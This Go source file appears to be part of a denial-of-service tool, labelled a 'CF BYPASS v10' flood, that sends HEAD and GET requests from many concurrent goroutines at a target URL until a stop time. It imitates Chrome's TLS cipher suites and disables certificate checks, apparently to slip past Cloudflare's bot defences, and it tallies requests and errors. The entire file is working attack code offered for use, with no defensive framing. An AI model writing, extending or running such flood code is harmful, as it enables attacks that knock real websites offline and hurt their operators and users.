package main

import (
	"crypto/tls"
	"fmt"
	"io"
	mrand "math/rand"
	"net"
	"net/http"
	"sync"
	"sync/atomic"
	"time"
)

func chromeCiphers() []uint16 {
	return []uint16{
		tls.TLS_AES_128_GCM_SHA256,
		tls.TLS_AES_256_GCM_SHA384,
		tls.TLS_CHACHA20_POLY1305_SHA256,
		tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
		tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
		tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
		tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
		tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,
		tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
	}
}

func stClient() *http.Client {
	t := &http.Transport{
		MaxIdleConns:        10000,
		MaxIdleConnsPerHost: 4096,
		IdleConnTimeout:     90 * time.Second,
		DisableKeepAlives:   false,
		ForceAttemptHTTP2:   true,
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
			MinVersion:         tls.VersionTLS12,
			MaxVersion:         tls.VersionTLS13,
			CipherSuites:       chromeCiphers(),
			CurvePreferences:   []tls.CurveID{tls.X25519, tls.CurveP256},
		},
		DialContext: (&net.Dialer{
			Timeout: 3 * time.Second, KeepAlive: 30 * time.Second, DualStack: true,
		}).DialContext,
		TLSHandshakeTimeout:   3 * time.Second,
		ResponseHeaderTimeout: 5 * time.Second,
	}
	return &http.Client{
		Transport: t,
		Timeout:   10 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
}

func executeMixVectorStenlyCFBypass(threadCount int) {
	fmt.Println("[STENLY] CF BYPASS v10 — buildRequest() | HEAD 80% + GET 20% | Chrome TLS")

	var wg sync.WaitGroup
	for i := 0; i < threadCount; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			rng := mrand.New(mrand.NewSource(time.Now().UnixNano() + int64(id*137)))
			client := stClient()

			for time.Now().Before(stopTime) {
				reqPool := make([]*http.Request, POOL_SIZE_FLOOD)
				for p := 0; p < POOL_SIZE_FLOOD; p++ {
					method := "HEAD"
					bypass := 1
					if rng.Intn(5) == 0 {
						method = "GET"
						if rng.Intn(4) == 0 {
							bypass = 2
						}
					}
					reqPool[p], _ = buildRequest(method, targetURL, false, bypass)
				}

				for j := 0; j < POOL_SIZE_FLOOD && time.Now().Before(stopTime); j++ {
					resp, err := client.Do(reqPool[j])
					if err != nil {
						atomic.AddUint64(&totalErrors, 1)
						continue
					}
					io.Copy(io.Discard, resp.Body)
					resp.Body.Close()
					atomic.AddUint64(&totalRequests, 1)
				}

				time.Sleep(randomThinkTime())
			}
		}(i)
	}
	wg.Wait()
}
